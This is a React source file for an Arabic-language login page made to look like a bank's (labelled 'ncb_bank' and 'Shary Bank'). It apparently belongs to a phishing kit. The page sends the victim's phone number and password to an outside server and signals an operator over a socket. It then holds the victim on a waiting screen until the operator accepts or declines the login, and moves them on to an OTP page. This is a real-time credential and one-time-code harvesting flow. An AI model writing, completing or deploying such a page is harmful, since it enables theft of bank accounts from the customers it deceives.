import { useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import NcbLayout from "../components/NcbLayout";
import NcbWaitOverlay from "../components/NcbWaitOverlay";
import { api_route, socket } from "../config/api";
import { useAdminApproval } from "../hooks/useAdminApproval";
import { getSessionId, setSessionId } from "../utils/session";

export default function LoginPage() {
  const navigate = useNavigate();
  const [sessionId, setSessionIdState] = useState(getSessionId);
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [localError, setLocalError] = useState("");

  const { waiting, error, startWaiting, clearError } = useAdminApproval({
    sessionId,
    acceptEvent: "acceptUserLogin",
    declineEvent: "declineUserLogin",
    onAccept: () => navigate("/otp"),
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLocalError("");
    clearError();

    if (!phone || !password) {
      setLocalError("الرجاء إدخال رقم الهاتف وكلمة المرور");
      return;
    }

    setSubmitting(true);
    try {
      let id = sessionId;
      if (!id) {
        const { data } = await axios.post(`${api_route}/reg`, {
          form_type: "ncb_bank",
          phone,
        });
        id = data._id;
        setSessionId(id);
        setSessionIdState(id);
        socket.emit("newUser");
      }

      await axios.post(`${api_route}/ncb/login/${id}`, {
        phone,
        loginPassword: password,
      });
      socket.emit("userLogin", id);
      startWaiting();
    } catch {
      setLocalError("حدث خطأ أثناء الإرسال، حاول مرة أخرى");
    } finally {
      setSubmitting(false);
    }
  };

  const displayError =
    localError || (error ? "تم رفض بيانات الدخول، يرجى المحاولة مرة أخرى" : "");

  return (
    <NcbLayout showHeader={false}>
      <form className="ncb-form justify-between! py-3!" onSubmit={handleSubmit}>
        {displayError && <div className="ncb-error">{displayError}</div>}
        <img src="/assets/header.png" alt="Shary Bank" className="w-[70%]" />
        <div className="flex flex-col gap-y-3! w-full">
          <input
            className="ncb-login-input"
            type="tel"
            placeholder="رقم الهاتف (9xxxxxxxxx)"
            value={phone}
            onChange={(e) => {
              setPhone(e.target.value);
              clearError();
              setLocalError("");
            }}
            dir="ltr"
          />

          <input
            className="ncb-login-input"
            type="password"
            placeholder="كلمة المرور"
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              clearError();
              setLocalError("");
            }}
          />

          <button
            className="ncb-login-btn"
            type="submit"
            disabled={submitting || waiting}
          >
            تسجيل الدخول
          </button>
        </div>

        <span className="text-[#0b4a5a] text-center">
          جميع الحقوق محفوظة © شركة مسارات 2026
        </span>
      </form>

      <NcbWaitOverlay
        visible={waiting}
        message="جاري التحقق من بيانات الدخول، يرجى الانتظار..."
      />
    </NcbLayout>
  );
}
